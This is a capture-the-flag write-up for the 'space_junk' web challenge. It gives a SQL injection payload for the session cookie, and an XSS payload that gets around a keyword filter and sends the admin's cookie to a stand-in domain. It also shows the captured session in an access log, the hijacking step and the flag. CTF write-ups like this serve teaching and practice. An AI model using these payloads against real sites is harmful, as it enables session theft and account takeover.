# 04-space_junk
## Hints
### (Hint 1) Edit 3-14-20 21:43 UTC
- We've received a transmission questioning the security of our sessions, we value our users security and privacy and we are monitoring this inquiry.
- This hint was meant to help people look at the session cookie, also inquiry is a synonym for query, which was a hint to a database query.


### (Hint 2) Edit 3-15-20  00:01 UTC
- We've investigated the query and have decided that we haven't found anything vulnerable so we feel like it is secure. -Management
- This hint was to be more direct about the query, which was again a hint about the sessions using a database.


## Step 1: blind sql logic injection of the session cookie
- This was a little out of left field, some source should have been released for this so people had some sort of idea what was going on.
- All you had to do was set the session cookie to `1' or 1=1 -- -`
- We get access to the /moderator/post and /moderator/status pages


## Step 2: xss in the username field
- Case insensitive single removal of:
    - script
    - onerror
    - img
- It also truncates the input to 126 characters


### Create a script to escape the filter using your domain
```
</title><sscriptcript>document.location='http://yourdomain.com?c='+document.cookie</sscriptcript><title>
```


### Check your access logs for session of admin
```
"GET /?c=session=38,100,000,000(38.1%20billion);%20is_bot=1 HTTP/1.1" 200 423 "http://localhost:3000/moderator/post" "Mozilla/5.0 Chrome/10.0.613.0 Safari/534.15 Zombie.js/6.1.4"
```
- Use the session in your session cookies to session hijack the admin and then you get access to /admin and the flag


# Flag
- pctf{cyber_truck_more_like_cyber_rocket}
